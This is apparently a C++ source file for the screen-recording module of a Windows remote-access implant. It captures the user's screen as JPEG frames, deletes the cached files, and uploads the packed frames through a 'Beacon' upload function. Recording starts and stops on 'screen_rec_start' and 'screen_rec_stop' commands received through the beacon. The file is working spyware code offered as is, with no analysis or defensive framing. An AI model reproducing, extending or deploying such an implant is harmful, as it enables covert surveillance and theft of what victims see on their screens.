#include "screen_recorder.h"
#include "../config.h"
#include "../utils.h"
#include "../beacon.h"
#include <windows.h>
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

namespace ScreenRecorder {
    bool recording = false;
    HANDLE hThread = NULL;
    int durationSec = 60;
    int fps = 10;
    int quality = 80;
    std::string currentFile;
    
    ULONG_PTR gdiToken = 0;
    
    struct JpegEncoderParams {
        ULONG quality;
        EncoderParameters params;
    };
    
    std::vector<BYTE> CaptureScreenToJpeg(int quality) {
        HDC hScreen = GetDC(NULL);
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HDC hDC = CreateCompatibleDC(hScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
        SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
        
        // Convert to JPEG using GDI+
        Gdiplus::Bitmap bitmap(hBitmap, NULL);
        
        CLSID clsid;
        Gdiplus::GetEncoderClsid(L"image/jpeg", &clsid);
        
        Gdiplus::EncoderParameters encoderParams;
        encoderParams.Count = 1;
        encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encoderParams.Parameter[0].NumberOfValues = 1;
        ULONG q = quality;
        encoderParams.Parameter[0].Value = &q;
        
        IStream* stream = NULL;
        CreateStreamOnHGlobal(NULL, TRUE, &stream);
        bitmap.Save(stream, &clsid, &encoderParams);
        
        // Read stream to vector
        STATSTG stat;
        stream->Stat(&stat, STATFLAG_NONAME);
        LARGE_INTEGER pos = {0};
        stream->Seek(pos, STREAM_SEEK_SET, NULL);
        
        std::vector<BYTE> data(stat.cbSize.LowPart);
        ULONG read = 0;
        stream->Read(data.data(), stat.cbSize.LowPart, &read);
        stream->Release();
        
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        
        return data;
    }
    
    DWORD WINAPI RecordThread(LPVOID param) {
        CreateDirectoryA(SCREEN_CACHE_PATH, NULL);
        
        std::string timestamp = std::to_string(time(0));
        currentFile = std::string(SCREEN_CACHE_PATH) + "\\rec_" + timestamp;
        
        int frames = durationSec * fps;
        int intervalMs = 1000 / fps;
        
        for (int i = 0; i < frames && recording; i++) {
            auto jpeg = CaptureScreenToJpeg(quality);
            std::string frameFile = currentFile + "_" + std::to_string(i) + ".jpg";
            Utils::WriteFileBinary(frameFile, jpeg);
            Sleep(intervalMs);
        }
        
        // Package frames into a simple format (or upload individually)
        // For now, upload all frames as a zip-like sequence
        std::vector<BYTE> archive;
        for (int i = 0; i < frames; i++) {
            std::string frameFile = currentFile + "_" + std::to_string(i) + ".jpg";
            auto data = Utils::ReadFileBinary(frameFile);
            if (data.empty()) break;
            
            // Simple header: 4 bytes size + data
            DWORD size = (DWORD)data.size();
            archive.insert(archive.end(), (BYTE*)&size, (BYTE*)&size + sizeof(size));
            archive.insert(archive.end(), data.begin(), data.end());
            
            DeleteFileA(frameFile.c_str());
        }
        
        if (!archive.empty()) {
            Beacon::UploadFile("screen_rec", "screen_rec.bin", archive);
        }
        
        recording = false;
        return 0;
    }
    
    void Start(const std::string& params) {
        if (recording) return;
        
        // Parse params (simplified)
        durationSec = 60;
        fps = SCREEN_FPS;
        quality = SCREEN_QUALITY;
        
        if (!gdiToken) {
            Gdiplus::GdiplusStartupInput input;
            Gdiplus::GdiplusStartup(&gdiToken, &input, NULL);
        }
        
        recording = true;
        hThread = CreateThread(NULL, 0, RecordThread, NULL, 0, NULL);
    }
    
    void Stop() {
        recording = false;
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
            hThread = NULL;
        }
    }
    
    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "screen_rec_start") Start(cmd.params);
        else if (cmd.type == "screen_rec_stop") Stop();
    }
    
    bool IsRecording() { return recording; }
}